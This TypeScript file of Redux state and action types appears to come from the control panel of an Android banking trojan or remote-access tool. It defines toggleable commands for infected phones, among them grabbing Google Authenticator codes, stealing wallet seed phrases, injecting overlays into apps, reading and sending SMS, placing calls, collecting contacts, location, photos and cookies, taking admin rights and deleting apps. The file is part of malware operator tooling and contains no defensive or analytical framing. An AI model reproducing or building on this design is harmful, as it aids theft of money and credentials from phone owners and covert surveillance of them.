export const AC_CHANGE_ENABLED = "AC_CHANGE_ENABLED";
export const AC_CHANGE_COMMAND_FIELDS = "AC_CHANGE_COMMAND_FIELDS";

export type allowedCommands = "getaccounts" | "getinstallapps" | "updateinjectandlistapps" |
    "getsms" | "getcontacts" | "googleAuthGrabber" |
    "calling" | "startinject" | "push" | "sendsms" | "seedPhrase" |
    "clearcache" | "runApp" | "deleteapplication" | "openurl";

export interface Toggleable {
    enabled: boolean,
}

interface ToggleableWithApplication extends Toggleable {
    application?: string,
    url?: string,
}

export type GetAccountsState = Toggleable;
export type GetInstalledAppsState = Toggleable;
export type UpdateInjectListState = Toggleable;
export type getsmsState = Toggleable;
export type GetAdminRightsState = Toggleable;
export type GoogleAuthGrabberState = Toggleable;
export type ClearAppDataState = ToggleableWithApplication;
export type RunAppState = ToggleableWithApplication;
export type DeleteAppState = ToggleableWithApplication;
export type OpenUrlState = ToggleableWithApplication;
export type OpenInjectState = ToggleableWithApplication;

export interface CallingState extends Toggleable {
    number: string,
    locked: boolean,
}


export interface SendPushState extends ToggleableWithApplication {
    title: string,
    text: string,
}

export interface SendSMSState extends Toggleable {
    number: string,
    message: string,
}

export interface GetSeedPhraseState extends Toggleable {
    wallets: string[],
}

export interface AutoCommandsState {
    getaccounts: GetAccountsState,
    getinstallapps: GetInstalledAppsState,
    updateinjectandlistapps: UpdateInjectListState,
    googleAuthGrabber: GoogleAuthGrabberState,
    calling: CallingState,
    startinject: OpenInjectState,
    push: SendPushState,
    sendsms: SendSMSState,
    seedPhrase: GetSeedPhraseState,
    clearcache: ClearAppDataState,
    runApp: RunAppState,
    deleteapplication: DeleteAppState,
    openurl: OpenUrlState,
    getcallhistory: Toggleable,
    getcontacts: Toggleable,
    getlocation: Toggleable,
    getimages: Toggleable,
    getsms: Toggleable,
    startadmin: Toggleable,
    takescreenshot: Toggleable,
    startauthenticator2: Toggleable,
    protect: Toggleable,
    cookie: Toggleable,
    takephoto: Toggleable,
    isLoaded: boolean,
}

export interface ACChangeEnabledPayload extends Toggleable {
    command: allowedCommands,
}

export interface ACChangeEnabledAction {
    type: typeof AC_CHANGE_ENABLED,
    payload: ACChangeEnabledPayload,
}

export type ACChangeCommandFieldsPayload = Omit<AutoCommandsState, "isLoaded">;

export interface ACChangeCommandFieldsAction {
    type: typeof AC_CHANGE_COMMAND_FIELDS,
    payload: ACChangeCommandFieldsPayload,
}

export type ACActionTypes = ACChangeEnabledAction | ACChangeCommandFieldsAction;
